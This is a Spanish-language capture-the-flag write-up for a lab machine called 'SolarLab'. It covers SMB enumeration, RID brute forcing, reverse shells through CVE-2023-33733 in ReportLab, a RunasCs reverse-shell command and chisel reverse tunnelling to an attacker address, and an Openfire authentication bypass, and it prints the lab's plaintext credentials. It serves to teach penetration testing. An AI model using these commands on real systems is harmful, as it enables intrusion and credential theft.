<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SolarLab</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SolarLab</h1><br/><p><ol><li> Realizo un escaneo de puertos<strong> nmap 10.10.11.16 -Pn -sC -sV --open -p- -oN scan.txt</strong></li><li>Encuentro los servicios  http(p.80) msrpc, netbios-ssn, microsoft-ds?, http(p.6791)</li><li>Mientras hago una enumeración de directorios accedo al otro htttp del puerto 6791</li><li>Lo añado a /etc/hosts</li><li>Al recargar me muestra un login </li></ol><img src="images/82-1.png" alt="images/82-1.png" /><ol><li>En la página del <strong>p.80</strong> no encuentro nada interesante por lo que muy probablemente tenga que passear este login</li><li>Intento varias injecciones y usuarios default sin exito. Lo más probable es que tenga que encontrar las <strong>credenciales</strong> y usarlas para entrar</li><li>En el <strong>p.445</strong> se está ejecutando <strong>SMB</strong></li><li>con el usuario anonymous puedo enumerar las shares que hay disponibles <strong>crackmapexec smb 10.10.11.16 -u &#39;anonymous&#39; -p &#39;&#39; --shares</strong> </li></ol><img src="images/82-2.png" alt="images/82-2.png" /><ol><li>Accedo a el share Documents con smbclient <strong>smbclient //10.10.11.16/Documents -U &quot;anonymous&quot;</strong> </li></ol><img src="images/82-3.png" alt="images/82-3.png" /><ol><li> En el archivo details-file.xlsx Encontramos unas pass </li></ol><img src="images/82-4.png" alt="images/82-4.png" /><ol><li>Lo siguiente que tendremos que hacer es un ataque de fuerza bruta de <strong>RIDs</strong> (Relative Identifiers)<strong> crackmapexec smb 10.10.11.16 -u &#39;anonymous&#39; -p &#39;&#39; --rid-brute</strong> </li></ol><img src="images/82-5.png" alt="images/82-5.png" /><ol><li>Encontramos las credenciales <strong> blake:ThisCanB3typedeasily1@</strong> </li></ol><img src="images/82-6.png" alt="images/82-6.png" /><ol><li>Al ser blake+byte llego a que el username es <strong>blakeb</strong>. Sigue teniendo la misma pass</li><li>Accedo al dashboard </li></ol><img src="images/82-7.png" alt="images/82-7.png" /><ol><li>Ahora tengo que buscar la forma de obtener un reverse shell</li><li>Veo que es un generador de pdfs. </li></ol><img src="images/82-8.png" alt="images/82-8.png" /><ol><li>Tras buscar encuentro el  <strong>CVE-2023-33733</strong> el cual por falta de comprobaciones en la función &quot;rl_safe_eval&quot; podemos injectar codigo malicioso en un archivo HTML que podemos convertir más tarde en un PDF usando la librería ReporLab.</li><li>Relleno todos los campos y intercepto la request de<strong> generate PDF</strong> con <strong>burpsuite</strong> </li></ol><img src="images/82-9.png" alt="images/82-9.png" /><ol><li>La request interceptada </li></ol><img src="images/82-10.png" alt="images/82-10.png" /><ol><li>Primero activamos el Listener </li></ol><img src="images/82-11.png" alt="images/82-11.png" /><ol><li>Luego creamos el reverse shell (Podemos hacerlo con msfvenom o con revshells.com)</li><li>Enviamos la solicitud POST y obtenemos el reverse </li></ol><img src="images/82-12.png" alt="images/82-12.png" /><ol><li></li></ol><img src="images/82-13.png" alt="images/82-13.png" /><ol><li>Pongo persistencia porqué le costó establecer el reverse shell</li><li>Para ello usar metasploit </li></ol><img src="images/82-14.png" alt="images/82-14.png" /><ol><li></li></ol><img src="images/82-15.png" alt="images/82-15.png" /><ol><li></li></ol><img src="images/82-16.png" alt="images/82-16.png" /><ol><li>Ejecuto Winpeas y encuentra el archivo<strong> users.db</strong>  </li></ol><img src="images/82-17.png" alt="images/82-17.png" /><ol><li>Descargo el archivo y dentro de esa db encuentro el usuario  </li></ol><img src="images/82-18.png" alt="images/82-18.png" /><ol><li>Encuentro las credenciales <strong>openfire:HotP!fireguard</strong>  <strong>db.session.add(User(username=&#39;blakeb&#39;, password=&#39;ThisCanB3typedeasily1@&#39;))</strong></li></ol><strong></strong></p><p><strong>	db.session.add(User(username=&#39;claudias&#39;, password=&#39;007poiuytrewq&#39;))</strong><strong></strong></p><p><strong>	db.session.add(User(username=&#39;alexanderk&#39;, password=&#39;HotP!fireguard&#39;)) </strong><ol><li>Para cambiar de usuario y obtener un shell usare <strong>RunasCs</strong> </li></ol><img src="images/82-19.png" alt="images/82-19.png" /><ol><li>Primero tengo que iniciar powershell para poder inciar RunasCs.exe<strong> ./runas.exe openfire HotP!fireguard powershell -r &lt;IP&gt;:&lt;PORT&gt;</strong> </li></ol><img src="images/82-20.png" alt="images/82-20.png" /><ol><li>Creo que openfire se está ejecutando en este puerto </li></ol><img src="images/82-21.png" alt="images/82-21.png" /><ol><li>Tendremos que hacer un portforwarding con chisel <strong>C:\Users\blake\Documents\app\chisel.exe client &lt;IP&gt;:&lt;PORT&gt; R:9090:127.0.0.1:9090</strong></li><li>Accedemos a través de nuestra propia máquina y encontramos un login </li></ol><img src="images/82-22.png" alt="images/82-22.png" /><ol><li>Este login tiene un exploit que permite bypasearlo <a href="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT">CVE-2023-32315</a></li><li>Tras buscar encuentro la ruta de la db <strong>C:\Program Files\Openfire\embedded-db\openfire</strong></li><li>Encuentro el hash de Administrator</li><li>Y lo desencripto con <a href="https://github.com/c0rdis/openfire_decrypt">openfire_decrypt</a></li><li> Obtengo las credenciales<strong> Administrator:ThisPasswordShouldDo!@</strong></li><li>Uso RunasCs para cambiarme al usuario <strong>Administrator</strong> y obtener la <strong>root</strong> <strong>flag</strong>   </li></ol></p></div>
</body>
</html>
